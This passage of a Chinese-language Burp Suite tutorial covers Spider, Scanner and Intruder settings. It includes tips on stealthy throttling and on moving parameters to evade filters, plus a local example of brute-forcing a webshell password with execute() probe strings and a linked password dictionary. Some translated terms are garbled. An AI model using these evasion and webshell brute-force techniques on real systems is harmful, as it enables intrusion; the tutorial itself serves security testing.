处理这些表格时，它会检查这些标准以确认表格是否是新的。旧的表格不会加入到提交序列。\n\n#### 2)Don’t submit\n\n如果选中这个，Burp Spider 不会提交任何表单。\n\n#### 3)prompt for guidance\n\n如果选中这个，在你提交每一个确认的表单前，Burp Suite 都会为你指示引导。这允许你根据需要在输入域中填写自定义的数据，以及选项提交到服务器的哪一个 区域，以及是否遍历整个区域。\n\n#### 4)automatically submit\n\n如果选中，Burp Spider 通过使用定义的规则来填写输入域的文本值来自动地提交范围内的表单。每一条规则让你指定一个简单的文本或者正则表达式来匹配表单字段名，并提交那些表单名匹配的字段值。可以为任意不匹配的字段指定默认值。\n\n在应用程序通常需要对所有输入域都是有效格式的数据的地方，如果你想通过登记表单 和相似功能自动地 spider，则这个选项会非常有用。在自动地把表单数据提交到广阔范围内 的应用程序时，Burp 使用一组非常成功的规则。当然，如果你遇到有自己需要提交的特定 值的表单字段名时，你可以修改这些或者添加自己的规则。你要小心地使用这个选项，因为 提交了表单里的虚假值有时会导致一些不希望看到操作。\n\n许多表单包含了多个提交元素，这些会对应用程序进行不同的操作，和发现不同的内容。 你可以配置 Spider 重复通过表单里提交元素的值，向每个表单提交多次，次数低于配置的 最大值。\n\n### Application Login\n\n![Image049](https://wooyun.js.org/images_result/images/2014101711120998771.png \"image049.png\")\n\n登陆表单在应用程序中扮演一个特殊角色，并且你常常会让 Burp 用和处理平常表单不 一样的方式来处理这个表单。使用这个配置，你可以告诉 Spider 在遇到一个表单执行下面 4 种不同操作的一种：\n\n```\n1.如果你没有证书，或者关注 Spidering 的敏感保护功能，Burp 可以忽略登陆表单。\n2.Burp 能交互地为你提示引导，使你能够指定证书。这时默认设置项。\n3.Burp 通过你配置的信息和自动填充规则，用处理其他表单的方式来处理登陆表单。\n4.在遇到的每个登陆表单时，Burp 能自动地提交特定的证书。 \n```\n\n在最后一种情况下，任何时间 Burp 遇到一个包含密码域的表单，会提交你配置的密码到密码域，提交你配置用户名到最像用户名的字段域。如果你有应用程序的证书，想让 Spider为你处理登陆，通常情况下这是最好的选项\n\n### Spider Engine\n\n![Image051](https://wooyun.js.org/images_result/images/2014101711121055065.png \"image051.png\")\n\n这些设置控制用于Spidering时发出HTTP请求的引擎。下列选项可用：\n\n```\n1)Number of threads----此选项控制并发请求进程数。\n2)Number of retries on network failure----如果出现连接错误或其他网络问题，BurpSuite会放弃和移动之前重试的请求指定的次数。测试时间歇性网络故障是常见的，所以最好是在发生故障时重试该请求了好几次。\n3)Pause before retry----当重试失败的请求，BurpSuite会等待指定的时间（以毫秒为单位）以下，然后重试失败。如果服务器被宕掉、繁忙或间歇性的问题发生，最好是等待很短的时间，然后重试。\n4)Throttle between requests----BurpSuite可以在每次请求之前等待一个指定的延迟（以毫秒为单位）。此选项很有用，以避免超载应用程序，或者是更隐蔽。\n5)Add random variations to throttle----此选项可以通过降低您的要求的时序模式进一步增加隐身。\n```\n\n### Request Headers\n\n这些设置控制由蜘蛛发出的HTTP请求中使用的请求头。您可以配置头蜘蛛在请求中使用的自定义列表。这可能是有用的，以满足各个应用程序的特定要求 - 例如，测试设计用于移动设备的应用程序时，以模拟预期的用户代理。\n\n以下选项也可用：\n\n![Image053](https://wooyun.js.org/images_result/images/2014101711121061095.png \"image053.png\")\n\n```\n1)Use HTTP version 1.1----如果选中，Spider会使用HTTP1.1版在其请求;否则，它会使用1.0版。\n\n2)Use Referer header----如果选中，Spider会要求从另一个页面链接到任何项目时提交相关Referer头。此选项很有用更加紧密地模拟将通过您的浏览器发出的请求，并且还可能需要浏览一些应用程序验证Referer头。\n```\n\n## Scanner功能\n\n### Using Burp Scanner\n\n分以下几个步骤来简单使用Scanner 1.设置好代理之后在地址栏输入你要抓取的地址，并且要在Proxy里把拦截关了，随后切换到Scanner的Results就可以看到地址已经在开始扫描咯\n\n![Image055](https://wooyun.js.org/images_result/images/2014101711121128756.png \"image055.png\")\n\n2.对地址右击还可以导出报告，\n\n![Image057](https://wooyun.js.org/images_result/images/2014101711121157380.png \"image057.png\")\n\n![Image059](https://wooyun.js.org/images_result/images/2014101711121141522.png \"image059.png\")\n\nHtml或者xml随便你以什么格式的，然后一直下一步下一步到如下图选择保存文件到哪\n\n![Image061](https://wooyun.js.org/images_result/images/2014101711121154576.png \"image061.png\")\n\n我们打开看看，是不是很漂亮呢\n\n![Image063](https://wooyun.js.org/images_result/images/2014101711121194134.png \"image063.png\")\n\n3.如果扫描出漏洞了我们还可以直接在这针对某个漏洞进行查看，如果想测试的话可以发送到Repeater进行测试哦\n\n![Image065](https://wooyun.js.org/images_result/images/2014101711121260493.png \"image065.png\")\n\n### Results\n\n结果选项卡包含所有的扫描仪已确定，从主动和被动扫描的问题。以一种树型图显示应用程序的内容，其中的问题已经被发现，使用URL分解成域，目录和文件的层次表示。如果您选择一个或多个部分的分支，所有选定的项目将扫描的问题都列出来，用组合在一起的相同类型的问题。您还可以扩大这些问题汇总查看所有的每种类型的个别问题。 如果您选择的问题那么将显示相应的详情，包括：\n\n```\n1)自定义的漏洞，咨询内容包括：\n问题类型及其整治的标准描述。\n中适用于该问题，并影响其修复任何特定的功能的描述。\n2)完整的请求和响应都是依据报告了该问题。在适用的情况，是相关的识别和再现问题的请求和响应的部分在请求和响应消息的编辑器中突出显示。\n```\n\n通常情况下，测试并验证一个问题最快的方法是使用发送到Repeater。另外，对于GET请求，您可以复制此URL，并将其粘贴到浏览器中。然后，您可以重新发出请求。 Burp扫描报告描述，每一个问题都会给出严重程度（高，中，低，资讯）和置信度（肯定的，坚定的，暂定）的评级。当一个问题一直使用一种技术，本质上是不太可靠（如SQL盲注）确定，Burp会让你意识到这一点，通过丢弃的置信水平存在一定不足。这些额定值应始终被解释为指示性的，你应该根据你的应用程序的功能和业务方面的知识进行审查。\n\n这个问题已经上市，你可以用它来执行以下操作的上下文菜单：如图所示\n\n![Image067](https://wooyun.js.org/images_result/images/2014101711121228957.png \"image067.png\")\n\n### Report selected issues\n\n启动BurpSuite Scanner的报告向导，生成的选定问题的正式报告。 Set severity - 这让你重新分配问题的严重程度。您可以设置严重程度高，中，低，或信息。您还可以标记问题作为假阳性。\n\n### Delect selected issues\n\n删除选定问题。请注意，如果你删除了一个问题，Burp重新发现了同样的问题（例如，如果你重新扫描了同样的要求），那么问题将再次报告。相反，如果你是一个假阳性标记的问题，那么这将不会发生。因此，最适合用于清理扫描结果移除你不感兴趣。对于内部的功能不需要您的问题仍然工作在主机或路径删除的问题，您应该使用假阳性的选项。\n\n### Scan Queue\n\nActive Scanning(主动扫描)过程通常包括发送大量请求到服务器为所扫描的每个基本的请求，这可能是一个耗时的过程。当您发送的主动扫描请求，这些被添加到活动扫描队列，它们被依次处理。如图\n\n![Image069](https://wooyun.js.org/images_result/images/2014101711121261155.png \"image069.png\")\n\n扫描队列中显示每个项目的详细信息如下：\n\n```\n1)索引号的项目，反映该项目的添加顺序。\n2)目的地协议，主机和URL 。\n3)该项目的当前状态，包括完成百分比。\n4)项目扫描问题的数量（这是根据所附的最严重问题的重要性和彩色化） 。\n5)在扫描项目的请求数量进行。\n注意 这不是插入点的数量的线性函数 - 观察应用程序行为的反馈到后续攻击的请求，仅仅因为它会为一个测试仪。\n6)网络错误的数目遇到的问题。\n7)为项目创建的插入点的数量。\n```\n\n这些信息可以让您轻松地监控个别扫描项目的进度。如果您发现某些扫描进度过于缓慢，可以理解的原因，如大量的插入点，缓慢的应用响应，网络错误等给定这些信息，你就可以采取行动来优化你的扫描，通过改变配置为插入点时，扫描引擎，或正在测试的主动扫描区域。\n\n你可以双击任何项目在扫描队列显示，到目前为止发现的问题，并查看了基本请求和响应的项目。您可以使用扫描队列的上下文菜单来执行各种操作来控制扫描过程。确切的可用选项取决于所选的项目（S ）的状态，并包括：如下图所示\n\n![Image071](https://wooyun.js.org/images_result/images/2014101711121223207.png \"image071.png\")\n\n### Show details\n\n这将打开显示到目前为止发现的问题的一个窗口，与底座请求和响应的项目。\n\n### Scan again\n\n此复制所选择的项目（S ） ，并将这些队列的末尾。\n\n### Delete item(S)\n\n这将永久地从队列中删除选定的项目（S ） 。\n\n### Delect finished items\n\n这永久删除那些已经完成了队列中的任何项目。\n\n### Automatically delete finished items\n\n这是否切换扫描器会自动从队列为他们完成删除项目。\n\n### Pause/resume scanner\n\n这可以暂停和恢复激活扫描仪。如果任何扫描正在进行时，扫描会暂停，而挂起的扫描请求完成后，通常会有一个短暂的延迟。\n\n### Send to\n\n这些选项用于所选项目的基本请求发送到其它Burp(Repeater、Intruder)工具。\n\n### Live Scanning\n\n实时扫描可让您决定哪些内容通过使用浏览器的目标应用，通过BurpProxy服务器进行扫描。您可以实时主动扫描设定live active scanning和live passive两种扫描模式。如图\n\n![Image073](https://wooyun.js.org/images_result/images/2014101711121272043.png \"image073.png\")\n\n### Live active scanning\n\n执行现场主动扫描，请执行以下步骤：\n\n```\n1)配置与目标的细节，你要主动扫描现场主动扫描设置。如果你已经配置了一套全范围的目标为你目前的工作，那么你可以简单地通知Burp主动扫描落在该范围内的每个请求。或者，您可以使用URL匹配规则定义自定义范围。 \n2)各地通过BurpProxy通常的方式应用浏览。这将有效地展示Burp要扫描的应用功能。对于每一个独特的所在范围的要求，你通过你的浏览器，Burp会排队主动扫描请求，并将努力走在后台找到漏洞为您服务。\n```\n\n### Live Passive Scanning\n\n现场演示被动扫描，请执行以下步骤：\n\n```\n1)配置具有您要被动地扫描目标的细节live passive scanning。默认情况下，Burp执行所有请求的被动扫描，但你可以限制扫描目标范围，或者使用URL匹配规则的自定义范围。 \n2)通过BurpProxy通常的方式应用浏览。这将有效地展示Burp你要扫描的应用功能。\n```\n\n### Options\n\n此选项卡包含Burp扫描选项进行攻击的插入点，主动扫描引擎，主动扫描优化，主动扫描区和被动扫描区域。\n\n### Attack Insertion Points\n\n这些设置控制扫描仪的地方“插入点(insertion points)”到被发送的主动扫描每个基本要求。插入点攻击将被放置，探测漏洞请求中的位置。每个定义的插入点单独扫描。 BurpSuite为您提供细粒度地控制放置插入点，以及这些选项仔细配置会让您量身定制您的扫描到您的目标应用程序的性质。插入点的配置也代表你的扫描速度和全面性之间进行权衡。\n\n注：除了让Burp自动指定插入点，就可以完全自定义这些，这样你就可以在你想要攻击的地方放在任意一个位置。要使用此功能，将请求发送给Intruder，用payload positions标签来定义通常的方式各插入点的开始和结束，并选择入侵者菜单选项“积极定义扫描插入点” 。您也可以指定以编程方式使用Burp扩展的自定义插入点位置。\n\n![Image075](https://wooyun.js.org/images_result/images/2014101711121335428.png \"image075.png\")\n\n#### 1)Insertion Point Locations\n\n这些设定可让您选择，其中插入点应放在请求中的位置的类型：\n\n```\nURLparameter values - URL查询字符串中标准的参数值。\nBody parameter values - 在邮件正文中，包括标准形式生成的参数参数值，属性的多重编码的参数，如上传的文件名， XML参数值和属性，和JSON值。\nCookieparameter values - 的HTTP Cookie的值。\nParameter name - 任意添加的参数的名称。 URL参数总是被添加，并且机身参数也加入到POST请求。测试一个附加的参数名称通常可以检测到被错过，如果只是参数值进行了测试异常的错误。\nHTTPheaders - 在引用页和用户代理标头的值。测试这些插入点通常可以检测如SQL注入或跨站脚本持续在日志记录功能的问题。\nAMF string parameters- 内AMF编码的邮件的任何字符串数据的值。\nREST-style URL parameters - URL的文件路径部分中的所有目录和文件名令牌的值。测试每一个插入点可以并处显著开销，如果你相信应用程序使用这些位置传送参数数据，才应使用。\n```\n\n#### 2)Change Parameter Locations\n\n允许您配置扫描仪将一些类型的插入点到其他地点的请求中，除了测试他们在原来的位置。例如，您可以将每个URL参数到邮件正文中，并重新测试它。或者你可以移动身体的每个参数到一个cookie ，然后重新测试它。\n\n用这种移动参数方式往往可以绕过防过滤器。许多应用程序和应用程序防火墙执行每个参数输入验证假设每个参数是它的预期位置的要求之内。移动参数到不同的位置可以回避这个验证。当应用程序代码后检索参数来实现其主要的逻辑，它可能会使用一个API，它是不可知的，以参数的位置。如果是这样，那么移动的参数可能可以使用输入，通常会在处理之前被过滤，以达到易受攻击的代码路径。\n\n下列选项可用于更改参数的位置：\n\n```\nURL to body\nURL to cookie\nBody to URL\nBody to cookie\nCookie to URL\nCookie to body\n```\n\n#### 3)Nested Insertion Points\n\n嵌套的插入时，会使用一个插入点的基值包含可识别的格式的数据。 例如，一个URL参数可能包含Base64编码数据，并且将解码后的值可能又包含JSON或XML数据。与使用启用嵌套插入点的选项，Burp会为输入在每个嵌套级别中的每个单独的项目适合的插入点。 Spider仅包含常规的请求参数请求时使用此选项不征收费用，但允许Burp达到更复杂的应用，数据是在不同的格式封装的攻击面。\n\n#### 4)Maximum Insertion Points Per Request\n\n无论你的设置选择，对于单个请求插入点的数目，一般视乎该请求的功能，如参数的数目。偶尔，请求可以包含的参数（几百或更多）数量。如果Burp执行的每个参数进行完全扫描，扫描会花费过多的时间量完成。 此设置允许您设置的，将每个基本要求生成插入点的数量的限制，从而防止您的扫描由偏快转为停滞，如果他们遇到含参数庞大的数字请求。在其中插入点的数量是由这个限制缩减的情况下，在有效扫描队列中的项目的条目将显示被跳过的插入点的数量，使您能够手动检查基本要求，并决定是否值得执行完全扫描其所有可能的插入点。\n\n#### 5)Skipping Parameters\n\n设定让您指定请求参数的Burp应该跳过某些测试。有跳过服务器端注入测试（如SQL注入）和跳过所有检查单独的列表。 服务器端注入测试是比较费时的，因为Burp发送多个请求探测服务器上的各种盲目的漏洞。如果您认为出现请求中的某些参数不容易（例如，内置仅由平台或Web服务器中使用的参数） ，你可以告诉Burp不能测试这些。 （用于测试客户端蝽象跨站点脚本涉及更少的开销，因为测试每个参数规定最小的开销在扫描期间，如果该参数不容易。 ） 如果一个参数是由您不希望测试一个应用程序组件来处理，或者修改一个参数是已知的导致应用程序不稳定跳过所有的测试可能是有用的。 列表中的每个项目指定参数类型，该项目要匹配（名称或值） ，匹配类型（文本字符串或正则表达式） ，表达式匹配。 你可以通过它们的位置（斜线分隔）的URL路径中标识的REST参数。要做到这一点，从参数下拉，“姓名”，从项目下拉“ REST参数” ，并指定您希望从测试中排除的URL路径中的位置的索引号（从1开始） 。您还可以通过值来指定REST参数。\n\n### Active Scanning Engine\n\n控制用来做主动扫描时发出HTTP请求的引擎。下列选项可用：\n\n![Image077](https://wooyun.js.org/images_result/images/2014101711121391377.png \"image077.png\")\n\n```\n1)Number of threads - 控制并发请求数。\n2)Number of retries on network failure - 如果出现连接错误或其他网络问题，Burp会放弃和移动之前重试的请求指定的次数。测试时间歇性网络故障是常见的，所以最好是在发生故障时重试该请求了好几次。\n3)Pause before retry - 当重试失败的请求，Burp会等待指定的时间（以毫秒为单位）以下，然后重试失败。如果服务器宕机，繁忙，或间歇性的问题发生，最好是等待很短的时间，然后重试。\n```\n\n**Throttle between requests** - 在每次请求之前等待一个指定的延迟（以毫秒为单位）。此选项很有用，以避免超载应用程序，或者是更隐蔽。\n\n**Add random variations to throttle** - 通过降低您的要求的时序模式进一步增加隐身。\n\n**Follow redirections where necessary**- 有些漏洞只能通过下面的重定向进行检测（例如，在一条错误消息，跨站点脚本这是只有下列一个重定向后退还）。因为某些应用程序的问题重定向到包含您所提交的参数值的第三方网址，BurpSuite保护您免受无意中攻击的第三方应用程序，不按照刚刚收取任何重定向。如果所扫描的要求是明确的目标范围之内（即您使用的是目标范围，以控制哪些被扫描的），然后BurpSuite只会跟随重定向是指同一范围内。如果所扫描的要求不在范围内（即你已经手动发起超出范围的请求的扫描），BurpSuite只会跟随重定向其中（a）是在同一台主机/端口的请求被扫描;及（b）没有明确涵盖的范围排除规则（如“logout.aspx”）。\n\n小心使用这些选项可让您微调扫描引擎，根据不同应用对性能的影响，并在自己的处理能力和带宽。如果您发现该扫描仪运行缓慢，但应用程序表现良好和你自己的CPU利用率很低，可以增加线程数，让您的扫描进行得更快。如果您发现连接错误发生，该应用程序正在放缓，或者说自己的电脑被锁定了，你应该减少线程数，也许增加网络故障和重试之间的间隔重试的次数。如果应用程序的功能是这样的：在一个基地的要求执行的操作干扰其他请求返回的响应，你应考虑减少线程数为1，以确保只有一个单碱基请求被扫描的时间。\n\n### Active Scanning Optimization\n\n主动扫描逻辑的行为，以反映扫描的目的和目标应用程序的性质。例如，您可以选择更容易发现问题，在一个大型应用程序的快速扫描;或者您可以执行更慢全面扫描，以发现更难，而且需要更多的扫描请求，以检测问题。\n\n![Image079](https://wooyun.js.org/images_result/images/2014101711121341699.png \"image079.png\")\n\n下列选项可用：\n\n**Scan speed(扫描速度)** - 该选项决定彻底的某些扫描检查，怎么会检查是否有漏洞时。 “Fast(快速)”设置使更少的请求，并检查一些漏洞更少的推导。在“Thorough(彻底)”的设置使更多的请求，并检查更多的衍生类型的漏洞。 “Normal(正常)”设定为中途在两者之间，并且代表速度和完整性之间的适当折衷对于许多应用。\n\n**Scan accuracy(扫描精度)** - 此选项决定的证据表明，扫描仪会报告某些类型的漏洞之前，要求的金额。可以只使用“blind(盲)”的技术，其中，Burp推断可能存在基于某些观察到的行为，如时间延迟或一个差分响应的一个漏洞被检测到的一些问题。因为这些观察到的行为的发生原因，无论如何，在没有相关联的漏洞的影响，该技术本身更容易出现假阳性比其他技术，例如在观察错误消息。试图减少误报，BurpSuite重复某些测试了一些，当一个假定的问题，推断时间，尝试建立提交的输入和观察到的行为之间有可靠的相关性。的准确性选项用于控制BurpSuite会多少次重试这些测试。在“Minimize false negatives(最小化假阴性)”的设置进行重试较少，因此更可能报告假阳性的问题，但也不太可能会错过由于不一致的应用程序行为的真正问题。在“Minimize false positives(最小化误报)”设置进行更多的试，所以是不太可能报告假阳性的问题，但可能会因此错误地错过了一些真正的问题，因为有些重试请求可能只是碰巧不返回结果是测试。 “Normal(正常)”设置为中途两者之间，并代表之间的假阳性和假阴性的问题合适的权衡对于许多应用。\n\n**Use intelligent attack selection(使用智能进攻选择)** - 此选项使通过省略出现无关紧要给每个插入点参数的基值支票扫描更有效率。例如，如果一个参数值包含不正常出现在文件名中的字符，BurpSuite会跳过文件路径遍历检查此参数。使用这个选项，可以加快扫描件，具有相对低的存在缺少实际的漏洞的风险。\n\n### Active Scanning Areas\n\n定义哪些是主动扫描过程中进行检查。是检查以下类别可供选择：\n\n![Image081](https://wooyun.js.org/images_result/images/2014101711121323228.png \"image081.png\")\n\n```\nSQL injection(SQL注入) - 这有子选项，以使不同的测试技术（误差为基础，延时测试，布尔条件测试） ，并且也使检查特定于单个数据库类型（ MSSQL ，Oracle和MySQL的） 。\nOS command injection(操作系统命令注入) - 这有子选项，以使不同的测试技术.。\nReflected XSS(反映了跨站点脚本)\nStored XSS(存储的跨站点脚本)\nFile path traversal(文件路径遍历)\nHTTP header injection(HTTP头注入)\nXML/SOAP injection(XML / SOAP注射)\nLDAP injection(LDAP注入)\nOpen redirection(开放重定向)\nHeader manipulation(头操纵)\nServer-level issues服务器级的问题\n```\n\n所执行的每个检查增加的请求的数目，以及每个扫描的总时间。您可以打开或关闭个别检查根据您的应用程序的技术知识。例如，如果你知道某个应用程序不使用任何LDAP ，您可以关闭LDAP注入测试。如果你知道哪个后端数据库的应用程序使用，你可以关闭SQL注入检测特定于其他类型的数据库。您也可以选择性地启用基于你如何严格要求你的扫描是检查。例如，您可以配置BurpSuite做应用程序的快速一次过，只为XSS和SQL注入的网址和参数检查，每漏洞类型更全面的测试在每一个插入点之前。\n\n### Passive Scanning Areas\n\n自定义的请求和响应的各个方面在被动扫描检查。下列选项可用：\n\n![Image083](https://wooyun.js.org/images_result/images/2014101711121316955.png \"image083.png\")\n\n```\nHeaders--头 \nForms--表格 \nLinks--链接 \nParameters--参数 \nCookie \nMIME类型 \nCaching缓存 \nInformation disclosure--信息披露 \nFrameable responses--耐燃反应（“点击劫持”） \nASP.NET的ViewState \n需要注意的是被动扫描不会派出自己的任何要求，和每个被动强加检查您的计算机上一个微不足道的处理负荷。不过，你可以禁用检查各个领域，如果你根本就不关心他们，不希望他们出现在扫描结果。\n```\n\n## Intruder\n\nBurp intruder是一个强大的工具，用于自动对Web应用程序自定义的攻击。它可以用来自动执行所有类型的任务您的测试过程中可能出现的。\n\n![Image085](https://wooyun.js.org/images_result/images/2014101711121336510.png \"image085.png\")\n\n![Image087](https://wooyun.js.org/images_result/images/2014101711121439648.png \"image087.png\")\n\n要开始去了解BurpSuite Intruder，执行以下步骤：\n\n```\n1)首先，确保Burp安装并运行，并且您已配置您的浏览器与Burp工作。\n2)如果你还没有这样做的话，浏览周围的一些目标应用程序，来填充的应用程序的内容和功能的详细信息Burp的SiteMap。在这样做之前，要加快速度，进入代理服务器选项卡，然后截取子标签，并关闭代理拦截（如果按钮显示为“Intercept is On”，然后点击它来截取状态切换为关闭） 。\n3)转到Proxy选项卡，并在History选项卡。发现一个有趣的前瞻性要求，您的目标应用程序，包含了一些参数。选择这个单一的请求，然后从上下文菜单中选择“Send to intruder” 。\n4)转到Intruder标签。Burp Intruder可以让你同时配置多个攻击。您Send to Intruder的每个请求在自己的攻击选项卡中打开，而这些都是顺序编号的默认。您可以双击标签头重命名选项卡，拖动标签来重新排序，并且还关闭和打开新的标签页。\n5)为您发送请求建立的Intruder选项卡，看看Target和Positions选项卡。这些已经自动填入您发送的请求的细节。\n6)Burp Intruder本质工作，采取了基本模板的要求（你送到那里的那个） ，通过一些payloads的循环，将这些payloads送入定义的Positions，基本要求范围内，并发出每个结果的要求。位置标签用于配置，其中有效载荷将被插入到基本要求的位置。你可以看到，BurpSuite一直在你想用来放置有效载荷自动进行猜测。默认情况下，有效载荷放入所有的请求参数和cookie的值。每对有效载荷标记定义了一个有效载荷的位置，并且可以从基体的要求，这将被替换的有效载荷的内容，当该payload position用于括一些文本。有关进一步详情，请参阅Payload Markers的帮助。\n7)旁边的请求编辑器中的按钮可以被用于添加和清除有效载荷的标志。试着增加payload position在新的地点请求中，并删除其他标志物，并看到效果了。当你理解了payload positions是如何工作的，请单击“Auto§ ”按钮恢复到BurpSuite为您配置的默认payload positions。如果你修改了请求本身的文本，可以重复步骤3创建与它的原始请求一个新的Intruder的攻击选项卡。\n```\n\n![Image089](https://wooyun.js.org/images_result/images/2014101711121441372.png \"image089.png\")\n\n```\n8)转到Payloads选项卡。这使您可以定义将要放入已定义的有效载荷仓的有效载荷。保持默认设置（使用有效载荷的“Simple list” ） ，并添加一些测试字符串到列表中。您可以通过输入到“Enter a new item”框中，单击“add”，输入自己的字符串。或者您可以使用“add from file”下拉菜单，然后选择“Fuzzing-quick”，从内置的负载串[专业版]列表中。\n9)现在，您已经配置了最低限度的选项来发动攻击。转到Intruder菜单，然后选择“Start attack” 。\n10)在包含在结果选项卡一个新的窗口中打开攻击。结果表包含已经取得，与各关键细节，如所使用的有效载荷， HTTP状态码，响应长度等，您可以在表中选择任何项目，以查看完整的请求和响应每个请求的条目。您还可以对表进行排序通过单击列标题，并使用过滤器栏过滤表中的内容。这些特征以相同的方式工作，作为Proxy history。\n11)这次袭击窗口包含其他标签，显示被用于当前攻击的配置。您可以修改大部分这种配置的攻击已经开始。转到选项选项卡，向下滚动到“ grep-match” ，并勾选“标志的结果与项目相匹配的响应这些表达式” 。这将导致Intruder检查响应匹配列表中的每个表达式项目和标志的火柴。默认情况下，列表显示fuzzing时是很有用的一些常见的错误字符串，但可以配置，如果你想自己的字符串。返回result选项卡，看到Intruder增加了对每个项目列在列表中，而这些包含复选框，指示表达式是否被发现在每一个响应。如果你是幸运的，你的基本模糊测试可能引发一个错误的存在在一些回应的错误消息。\n12)现在，在表中选择任何项目，并期待在该项目的响应。发现在反应（如网页标题，或错误消息）一个有趣的字符串。右键单击该项目在表中，然后从上下文菜单中选择“Define extrace grep from response” 。在对话框中，选择响应的有趣字符串，然后单击“确定” 。结果表中现在包含一个新的列，其提取这一段文字从每个响应（其可以是不同的在每一种情况下） 。您可以使用此功能来定位在大型攻击有趣的数据与成千上万的反应。请注意，您还可以配置“extrace grep ”项目中的选项选项卡，在此之前前或在攻击期间。\n13)在结果表中选择任一项目，并打开上下文菜单。选择“Send to Repeater” ，然后转到Repeater选项卡。你会看到所选的请求已被复制到Repeater工具，进行进一步的测试。许多其他有用的选项是可用的上下文菜单中。有关发送BurpSuite工具之间的项目，使整体测试工作流程的详细信息。\n14)您可以使用“Save”菜单在结果窗口中都救不结果表或整个攻击。你可以加载结果表到其他工具或电子表格程序。您可以通过在主Burp的UI Intruder菜单重新加载保存的攻击。\n15)这些步骤只介绍一个简单的用例Intruder，对于Fuzzing的要求有一些标准的攻击字符串和用grep搜索中的错误消息。您可以使用Intruder许多不同类型的攻击，有许多不同的payloads和攻击选项。\n```\n\n### Using Burp Intruder\n\nfor example 这里我本地搭建一个环境，爆破一个php大马，如果是一句话就把get改成post，如果是php一句话，就在下面加上php这行代码，如图\n\n![Image091](https://wooyun.js.org/images_result/images/2014101711121444235.png \"image091.png\")\n\n```\nasp     password=execute(\"response.clear:response.write(\"\"passwordright\"\"):response.end\")\nphp     password=execute(\"response.clear:response.write(\"\"elseHelloWorld\"\"):response.end\")\naspx    password=execute(\"response.clear:response.write(\"\"elseHelloWorld\"\"):response.end\")。\n```\n\n一般步骤如下\n\n1.代理好服务器地址，然后访问这个大马地址\n\n![Image093](https://wooyun.js.org/images_result/images/2014101711121481236.png \"image093.png\")\n\n2.随后点击forward,并且在大马页面随便输入什么，burp拦截了数据之后发送到repeater\n\n![Image095](https://wooyun.js.org/images_result/images/2014101711121481236.png \"image095.png\")\n\n3.切换到repeater选项卡中，点击go按钮，找出一些反馈的错误信息，当然如果不要也可以，这里找错误信息是方便爆破成功了之后便于发现，我这个马反馈的是中文错误信息，显示是乱码就不写了，我们可以通过爆破成功了之后看字节数。 4.接下来就是发送到intruder，target一般都不需要管，已经自动填好了，然后选择positions\n\n![Image097](https://wooyun.js.org/images_result/images/2014101711121567189.png \"image097.png\")\n\n先点击Clear$，选择密码地地方点击add$。\n\n![Image099](https://wooyun.js.org/images_result/images/2014101711121551234.png \"image099.png\")\n\n5.切换到payloads设置payload type，选择我们自己的字典\n\n![Image101](https://wooyun.js.org/images_result/images/2014101711121532703.png \"image101.png\")\n\n6.切换到options去设置进程数和失败之后重试次数、过滤结果\n\n![Image103](https://wooyun.js.org/images_result/images/2014101711121554609.png \"image103.png\")\n\n一般我都会把Grep-Match清理掉，省得干扰。\n\n![Image105](https://wooyun.js.org/images_result/images/2014101711121599797.png \"image105.png\")\n\n7.接下来点击intruder下的start attack就开始爆破了，密码admin，我是根据length来判断跟其他的不同\n\n![Image107](https://wooyun.js.org/images_result/images/2014101711121647776.png \"image107.png\")\n\n附赠一个webshell字典：[shellpassword.txt.zip](https://wooyun.js.org/images_result/images/2014101711121696735.zip)\n\n### Target\n\n用于配置目标服务器进行攻击的详细信息。所需的选项有： Host(主机) - 这是目标服务器的IP地址或主机名。 Port(端口) - 这是HTTP / S服务的端口号。 Use HTTPS(使用HTTPS)，这指定的SSL是否应该被使用。 配置这些细节最简单的方法是选择你要攻击中BurpSuite的任何地方的请求，并选择上下文菜单中的“Send to intruder”选项。这将发送选定的请求，在intruder一个新的选项卡，将自动填充的目标和位置选项卡。\n\n### Positions\n\n用于配置request temlate的攻击，和payloads markers、attack type一起。\n\n### Request Template\n\n主要请求编辑器是用来定义从所有攻击请求都将被导出的请求模板。对于每一个攻击的请求，BurpSuite接受请求的模板，并把一个或多个有效载荷送入由有效载荷标记定义的位置。 成立请求模板的最简单的方法是选择你要攻击中BurpSuite的任何地方的请求，并选择上下文菜单中的“Send to intruder”选项。这将发送选定的请求，在intruder的选项卡，将自动填充的Target和Positions选项卡。\n\n### Payload Markers\n\n有效载荷的标记是使用§字符，并且功能如下放置：\n\n```\n1)每对标记指定一个有效载荷的位置。\n2)一对标记物可以从它们之间任选的模板要求附上一些文字。\n3)当一个有效载荷的位置被分配了一个有效载荷，无论是标记和任何包含的文本将被替换为有效载荷。\n4)当一个有效载荷的位置不具有分配的有效载荷，该标记将被删除，但是所包含的文本保持不变。\n```\n\n为了使配置更加简单，Intruder会自动突出显示每对有效载荷的标记和任何它们之间包含的文本。\n\n您可以手动或自动做有效载荷标记。当您从BurpSuite别处发送一个请求到Intruder，Intruder猜测你可能要放置有效载荷，并设置相应的有效载荷标记。您可以修改使用按钮的默认有效载荷标记旁边的请求模板编辑器：\n\nAdd§ - 如果没有文本被选中，该插入一个有效载荷标记在光标位置。如果您已经选择了一些文字，一对标记插入封闭选定的文本。 Clear§ - 这将删除所有的位置标记，无论是从整个模板或模板的选定部分。 Auto§ - 自动放置有效载荷标记。包括价值：\n\n```\n1)URL查询字符串参数\n2)车身参数\n3)曲奇饼\n4)多重参数属性（例如，在文件上传的文件名）\n5)XML数据和元素属性\n6)JSON参数\n```\n\n您可以配置自动负载位置是否将更换或追加到现有的参数值，通过入侵者菜单上的选项。需要注意的是，如果一个子部分的要求，但不是整个消息体，包含格式化数据使用XML或JSON ，可以自动通过这种结构中的位置的有效载荷手动选择格式化数据的准确块，并使用“自动”按钮在其定位的有效载荷。这是有用的，例如，当一个多参数的值包含在XML或JSON格式数据。\n\n```\n刷新 - 这将刷新请求模板编辑器的语法彩色化，如果必要的。\n清除 - 这会删除整个请求模板。\n```\n\n注意：您也可以使用入侵者的有效载荷仓的UI通过BurpSuite扫描仪配置自定义插入点主动扫描。要做到这一点，配置请求模板和有效载荷在标记内入侵者通常的方式，然后选择从入侵者菜单中的“主动扫描定义插入点” 。\n\n### Attack type\n\nBurp Intruder支持各种攻击类型 - 这些决定在何种负载分配给有效载荷仓的方式。攻击类型可以使用请求模板编辑器上方的下拉菜单进行选择。以下攻击类型可供选择：\n\n![Image109](https://wooyun.js.org/images_result/images/2014101711121998569.png \"image109.png\")\n\nSniper(狙击手) - 这将使用一套单一的payloads。它的目标依次在每个有效载荷的位置，并把每个有效载荷送入依次那个位置。这不是针对一个给定的请求的位置不受影响 - 